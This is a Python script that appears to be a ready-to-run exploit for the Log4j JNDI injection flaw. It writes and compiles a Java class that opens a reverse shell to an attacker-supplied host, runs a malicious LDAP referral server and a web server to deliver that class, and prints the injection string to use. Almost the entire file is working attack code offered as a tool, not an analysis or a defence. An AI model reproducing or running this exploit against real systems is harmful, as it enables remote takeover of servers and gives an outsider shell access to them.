#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CURRENT_FOLDER = Path(__file__).parent.resolve()


def payloadGenerator(ip, lport):
    exploitCode= """
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;

    public class Exploit { 

        public Exploit() throws Exception {
            String host="%s";
            int port=%d;
            String cmd="/bin/sh";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(),
                pe=p.getErrorStream(),
                si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0)
                    so.write(pi.read());
                while(pe.available()>0)
                    so.write(pe.read());
                while(si.available()>0)
                    po.write(si.read());
                so.flush();
                po.flush();
             Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }
                catch (Exception e){
                }
            };
            p.destroy();
            s.close();
        }
    }
""" % (ip, lport)

    #  creating Exploit.java file

    exploitFile = Path("Exploit.java")

    try:
        exploitFile.write_text(exploitCode)
        subprocess.run([os.path.join(CURRENT_FOLDER, "/usr/bin/jdk1.8.0_202/bin/javac"), str(exploitFile)])
    except OSError as err:
        print(Fore.BLUE + f'There is a problem {err}')
        raise err
    else:
        print(Fore.YELLOW + 'Exploit.java file was created successfully !')


def payload(ip, wport, lport):
    payloadGenerator(ip, lport)

    print(Fore.YELLOW + 'LDAP server is being setting up!\n')
    # creating a LDAP server on another thread
    thread = threading.Thread(target=ldapServer, args=(ip, wport))
    thread.start()

    # starting the webserver
    print(f"Webserver is starting on port {wport} http://0.0.0.0:{wport}")
    webserver = HTTPServer(('0.0.0.0', wport), SimpleHTTPRequestHandler)
    webserver.serve_forever()


def ldapServer(ip, lport):
    payload = "$/{jndi:ldap://%s:1389/Exploit}" % (ip)
    print(Fore.YELLOW + f"Here's the payload to inject : {payload}\n")
    url = "http://{}:{}/#Exploit".format(ip, lport)
    subprocess.run([
        os.path.join(CURRENT_FOLDER, "/usr/bin/java"),
        "-cp",
        os.path.join(CURRENT_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main():
    init(autoreset=True)
    print(Fore.YELLOW,"""
   _____ ____ ___   _______   ____ _____       __                __ __  _ 
  / ___// __ \__ \ /  _/__ \ / __ \__  /      / /   ____  ____ _/ // / (_)
  \__ \/ /_/ /_/ / / / __/ // / / //_ <______/ /   / __ \/ __ `/ // /_/ / 
 ___/ / _, _/ __/_/ / / __// /_/ /__/ /_____/ /___/ /_/ / /_/ /__  __/ /  
/____/_/ |_/____/___//____/\____/____/     /_____/\____/\__, /  /_/_/ /   
                                                       /____/    /___/   
    """)
    parser = argparse.ArgumentParser(description='Log4j exploit')
    parser.add_argument('--ip',
                        metavar='ip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--wport',
                        metavar='wport',
                        type=int,
                        default='8000',
                        help='listener port for webserver')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='netcat listener port')
    args = parser.parse_args()

    try:
        payload(args.ip, args.wport, args.lport)
    except KeyboardInterrupt:
        print(Fore.BLUE + "The user stopped the exploit")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
